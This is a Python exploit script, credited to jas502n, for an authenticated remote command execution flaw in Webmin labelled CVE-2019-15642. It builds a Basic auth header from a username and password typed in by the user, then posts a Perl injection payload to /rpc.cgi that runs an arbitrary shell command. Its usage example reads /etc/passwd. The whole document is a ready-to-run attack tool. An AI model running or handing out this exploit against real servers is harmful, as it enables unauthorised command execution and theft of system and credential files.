import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import sys
import base64
import re


banner = '''
   _______      ________    ___   ___  __  ___        __ _____   __ _  _ ___  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ | ____| / /| || |__ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | |__  / /_| || |_ ) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| |___ \| '_ \__   _/ / 
 | |____   \  /  | |____    / /_| |_| || |  / /       | |___) | (_) | | |/ /_ 
  \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____/ \___/  |_|____|
                                                                              
                           python by jas502n 

                        Webmin RCE (Need Authorization)

   usage: python CVE-2019-15642.py https://xxx.xxx.xxx:10000 "cat /etc/passwd"                                                
'''

def CVE_2019_15642(url,auth_base64,cmd):
    vuln_url = url + '/rpc.cgi'
    headers = {
    "User-Agent":"webmin",
    "Connection":"close",
    "Content-Type":"application/x-www-form-urlencoded",
    "Authorization":"Basic %s"%auth_base64,
    "Content-Length":"70"
    }
    proxies = {
    'http': 'socks5h://127.0.0.1:1080',
    'https': "socks5h://127.0.0.1:1080"
    }

    payload = r'OBJECT CGI;print "Content-Type: Test\n\n";'+'$cmd=`%s`;print "$cmd";' % cmd
    print ("payload= %s" % payload)

    r = requests.post(url=vuln_url, data=payload, headers=headers, verify=False)
    if r.status_code ==200 and 'Content-type' in r.text:
        print ("\nVuln_Url= %s\n" % vuln_url)
        m = re.findall(r"(.+?)\nContent-type: text/plain",r.text,re.S)
        print (">>>Execute Response: \n%s" % m[0])
    else:
        print ("No Vuln Exit!")


if __name__ == '__main__':
    print (banner)
    username=raw_input("Please Input Webmin Username: ")
    password=raw_input("Please Input Webmin Password: ")
    auth = username+':'+password
    auth_base64 =  base64.b64encode(auth)
    print ('\n>>>Authorization: Basic %s\n' %auth_base64)
    


    url = sys.argv[1]
    cmd = sys.argv[2]

    CVE_2019_15642(url,auth_base64,cmd)